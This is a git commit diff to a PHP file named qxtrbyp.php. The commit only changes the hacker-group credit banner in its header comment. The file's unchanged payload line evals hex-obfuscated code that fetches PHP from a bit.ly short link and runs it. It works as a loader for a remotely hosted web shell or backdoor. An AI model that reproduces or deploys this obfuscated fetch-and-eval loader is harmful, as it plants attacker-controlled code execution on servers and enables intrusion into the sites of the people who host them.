5bb369507e161f8674a67845d9f7e30330405dfd
trhacknon <98242014+trhacknon@users.noreply.github.com>
2022-10-29 01:17:25 +0200

    Update qxtrbyp.php

--- qxtrbyp.php
+++ qxtrbyp.php
@@ -1,7 +1,7 @@
 <?php
 /*   ______________________________________
- |  Create By Mr. Quixter |   One Hat Cyber Team  |    
- |  Instagram: @mrquixter.official Tiktok: @mr.quixter
+ |  Create By Mr. Trhacknon |   Red Hat anonymous kicker  |    
+ |  we are anonymous, we dont forger, we dont forgive, Expect us. 
    ________________________________________
 */
 echo eval("\x3f\76" . file_get_contents("\x68\164\164\160\x73\72\x2f\x2f\x62\x69\x74\56\154\x79\x2f\63\111\x69\164\114\107\143"));
